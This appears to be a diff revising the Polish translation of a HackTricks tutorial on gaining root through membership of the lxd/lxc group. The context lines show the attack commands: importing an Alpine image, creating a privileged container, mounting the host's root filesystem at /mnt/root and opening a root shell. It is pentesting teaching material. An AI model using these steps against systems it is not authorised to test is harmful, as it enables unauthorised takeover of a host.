@@ -1,18 +1,18 @@
-# Grupa lxd/lxc - eskalacja uprawnień
+# lxd/lxc Group - Privilege escalation
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Jeśli należysz do _**lxd**_ **lub** _**lxc**_ **group**, możesz uzyskać uprawnienia root
+Jeśli należysz do grupy _**lxd**_ **lub** _**lxc**_, możesz uzyskać uprawnienia root
 
-## Exploiting bez internetu
+## Exploiting bez dostępu do Internetu
 
 ### Method 1
 
-Możesz pobrać alpine image do użycia z lxd z zaufanego repozytorium.  
-Canonical publikuje codzienne buildy na swojej stronie: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Pobierz **lxd.tar.xz** oraz **rootfs.squashfs** z najnowszego buildu. (Nazwa katalogu to data).
+Możesz pobrać obraz alpine do użycia z lxd z zaufanego repozytorium.
+Canonical publikuje codzienne buildy na swojej stronie: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Po prostu pobierz zarówno **lxd.tar.xz**, jak i **rootfs.squashfs** z najnowszego builda. (Nazwa katalogu to data).
 
-Alternatywnie możesz zainstalować na swoim komputerze ten distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (postępuj zgodnie z instrukcjami na githubie):
+Alternatywnie możesz zainstalować na swojej maszynie ten distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (postępuj zgodnie z instrukcjami na githubie):
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Prześlij pliki **incus.tar.xz** (**lxd.tar.xz**, jeśli zostały pobrane z repozytorium Canonical) oraz **rootfs.squashfs**, dodaj image do repo i utwórz kontener:
+Prześlij pliki **incus.tar.xz** (**lxd.tar.xz**, jeśli zostały pobrane z repozytorium Canonical) oraz **rootfs.squashfs**, dodaj obraz do repozytorium i utwórz kontener:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -52,7 +52,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Jeśli znajdziesz ten błąd _**Error: No storage pool found. Please create a new storage pool**_\
-> Uruchom **`lxd init`** i pozostaw wszystkie opcje domyślne. Następnie **powtórz** poprzedni zestaw poleceń
+> Uruchom **`lxd init`** i pozostaw wszystkie opcje domyślne. Następnie **powtórz** poprzedni fragment poleceń
 
 Na koniec możesz uruchomić kontener i uzyskać uprawnienia root:
 ```bash
@@ -62,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Metoda 2
 
-Zbuduj obraz Alpine i uruchom go przy użyciu flagi `security.privileged=true`, wymuszając interakcję kontenera z systemem plików hosta jako root.
+Zbuduj obraz Alpine i uruchom go za pomocą flagi `security.privileged=true`, wymuszając interakcję kontenera z systemem plików hosta jako root.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
